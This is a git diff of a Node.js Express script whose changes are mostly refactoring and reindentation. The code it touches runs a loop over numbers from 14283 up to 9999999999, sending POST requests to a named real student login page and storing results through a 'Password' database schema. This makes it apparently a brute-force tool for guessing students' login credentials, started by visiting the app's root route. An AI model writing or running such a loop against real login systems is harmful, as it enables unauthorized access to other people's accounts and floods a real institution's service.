@@ -1,10 +1,16 @@
 import Password from "./PawwordSchema.js";
 import mongoose from "mongoose";
 import dotenv from 'dotenv'
+import express from 'express'
 
 dotenv.config({
     path: './.env'
 });
+
+
+
+const app = express()
+const port = 3000
 
 let i;
 
@@ -23,25 +29,21 @@ async function connectDB() {
 }
 
 
-const express = require('express')
-const app = express()
-const port = 3000
-
 app.get('/', (req, res) => {
-  if(isInitiated) res.send(`initiated, current check ${i}`)
-  isInitiated = true;
-  main();
-  res.send('initiated')
+    if (isInitiated) res.send(`initiated, current check ${i}`)
+    isInitiated = true;
+    main();
+    res.send('initiated')
 })
 
 app.listen(port, () => {
-  console.log(`Example app listening on port ${port}`)
+    console.log(`Example app listening on port ${port}`)
 })
 
 
 
 const main = async () => {
-    for ( i = 14283; i <= 9999999999; i++) {
+    for (i = 14283; i <= 9999999999; i++) {
         const response = await fetch("https://agclms.in/Elogin/StudentLogin", {
             method: "POST",
             mode: "cors",
@@ -82,7 +84,5 @@ const main = async () => {
             return;
         }
     }
-
-
 
 }
